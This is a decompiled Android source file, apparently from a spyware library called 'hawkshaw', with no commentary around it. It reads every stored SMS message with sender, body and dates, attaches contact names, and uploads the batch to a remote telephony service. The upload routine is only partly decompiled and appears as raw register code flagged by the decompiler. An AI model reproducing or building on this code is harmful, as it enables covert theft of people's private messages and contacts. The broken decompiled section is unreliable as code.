package com.hawkshaw.library.features.telephony.messages;

import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.Telephony;
import com.hawkshaw.library.datalayer.models.Message;
import com.hawkshaw.library.features.telephony.contacts.GetContactsKt;
import java.util.ArrayList;
import java.util.List;
import me.pushy.sdk.lib.jackson.core.JsonLocation;

public final class GetMessagesKt {
    private static final String TAG = "GetMessages";

    private static final List<Message> getMessages(ContentResolver contentResolver, int i5) {
        ArrayList arrayList = new ArrayList();
        int i6 = i5;
        int i7 = i6 == -1 ? Integer.MAX_VALUE : i6;
        Cursor query = contentResolver.query(Telephony.Sms.CONTENT_URI, (String[]) null, (String) null, (String[]) null, "date DESC");
        while (query != null && query.moveToNext()) {
            int i8 = i7 - 1;
            if (i7 <= 0) {
                break;
            }
            int columnIndex = query.getColumnIndex("_id");
            String str = null;
            Long valueOf = query.isNull(columnIndex) ? null : Long.valueOf(query.getLong(columnIndex));
            int columnIndex2 = query.getColumnIndex("thread_id");
            Integer valueOf2 = query.isNull(columnIndex2) ? null : Integer.valueOf(query.getInt(columnIndex2));
            int columnIndex3 = query.getColumnIndex("address");
            String string = query.isNull(columnIndex3) ? null : query.getString(columnIndex3);
            int columnIndex4 = query.getColumnIndex("body");
            String string2 = query.isNull(columnIndex4) ? null : query.getString(columnIndex4);
            int columnIndex5 = query.getColumnIndex("subject");
            String string3 = query.isNull(columnIndex5) ? null : query.getString(columnIndex5);
            int columnIndex6 = query.getColumnIndex("type");
            Integer valueOf3 = query.isNull(columnIndex6) ? null : Integer.valueOf(query.getInt(columnIndex6));
            int columnIndex7 = query.getColumnIndex("date");
            Long valueOf4 = query.isNull(columnIndex7) ? null : Long.valueOf(query.getLong(columnIndex7));
            int columnIndex8 = query.getColumnIndex("date_sent");
            Long valueOf5 = query.isNull(columnIndex8) ? null : Long.valueOf(query.getLong(columnIndex8));
            int columnIndex9 = query.getColumnIndex("creator");
            if (!query.isNull(columnIndex9)) {
                str = query.getString(columnIndex9);
            }
            arrayList.add(new Message(valueOf, valueOf2, string, GetContactsKt.getContactName(contentResolver, string), string2, string3, valueOf3, valueOf4, valueOf5, str));
            i7 = i8;
        }
        if (query != null) {
            query.close();
        }
        return arrayList;
    }

    public static /* synthetic */ List getMessages$default(ContentResolver contentResolver, int i5, int i6, Object obj) {
        if ((i6 & 2) != 0) {
            i5 = JsonLocation.MAX_CONTENT_SNIPPET;
        }
        return getMessages(contentResolver, i5);
    }

    /* JADX WARNING: type inference failed for: r0v3, types: [c3.c] */
    /* JADX WARNING: Multi-variable type inference failed */
    /* JADX WARNING: Removed duplicated region for block: B:12:0x002f  */
    /* JADX WARNING: Removed duplicated region for block: B:8:0x0021  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static final java.lang.Object pushMessages(android.content.Context r6, a3.e r7) {
        
            boolean r0 = r7 instanceof com.hawkshaw.library.features.telephony.messages.a
            if (r0 == 0) goto L_0x0013
            r0 = r7
            com.hawkshaw.library.features.telephony.messages.a r0 = (com.hawkshaw.library.features.telephony.messages.a) r0
            int r1 = r0.f5043E
            r2 = -2147483648(0xffffffff80000000, float:-0.0)
            r3 = r1 & r2
            if (r3 == 0) goto L_0x0013
            int r1 = r1 - r2
            r0.f5043E = r1
            goto L_0x0018
        L_0x0013:
            com.hawkshaw.library.features.telephony.messages.a r0 = new com.hawkshaw.library.features.telephony.messages.a
            r0.<init>(r7)
        L_0x0018:
            java.lang.Object r7 = r0.f5042D
            b3.a r1 = b3.C0298a.f4140D
            int r2 = r0.f5043E
            r3 = 1
            if (r2 == 0) goto L_0x002f
            if (r2 != r3) goto L_0x0027
            Y1.C0110h.P(r7)
            goto L_0x0058
        L_0x0027:
            java.lang.IllegalStateException r6 = new java.lang.IllegalStateException
            java.lang.String r7 = "call to 'resume' before 'invoke' with coroutine"
            r6.<init>(r7)
            throw r6
        L_0x002f:
            Y1.C0110h.P(r7)
            android.content.ContentResolver r6 = r6.getContentResolver()
            Y1.K.k(r6)
            r7 = 2
            r2 = 0
            r4 = 0
            java.util.List r6 = getMessages$default(r6, r4, r7, r2)
            com.hawkshaw.library.datalayer.Injector$Companion r7 = com.hawkshaw.library.datalayer.Injector.Companion
            com.hawkshaw.library.datalayer.Injector r7 = r7.getInstance()
            com.hawkshaw.library.datalayer.network.service.TelephonyService r7 = r7.getTelephonyService()
            com.hawkshaw.library.datalayer.models.PushMessagesRequest r2 = new com.hawkshaw.library.datalayer.models.PushMessagesRequest
            r2.<init>(r6)
            r0.f5043E = r3
            java.lang.Object r7 = r7.pushMessages(r2, r0)
            if (r7 != r1) goto L_0x0058
            return r1
        L_0x0058:
            com.hawkshaw.library.datalayer.network.twirp.ApiResponse r7 = (com.hawkshaw.library.datalayer.network.twirp.ApiResponse) r7
            com.hawkshaw.library.logger.Logger r0 = com.hawkshaw.library.logger.Logger.INSTANCE
            java.lang.String r6 = r7.getState()
            java.lang.String r1 = "PushMessages: "
            java.lang.String r2 = i.C0528x.h(r1, r6)
            r4 = 4
            r5 = 0
            java.lang.String r1 = "GetMessages"
            r3 = 0
            com.hawkshaw.library.logger.Logger.d$default(r0, r1, r2, r3, r4, r5)
            return r7
        
        throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.features.telephony.messages.GetMessagesKt.pushMessages(android.content.Context, a3.e):java.lang.Object");
    }
}
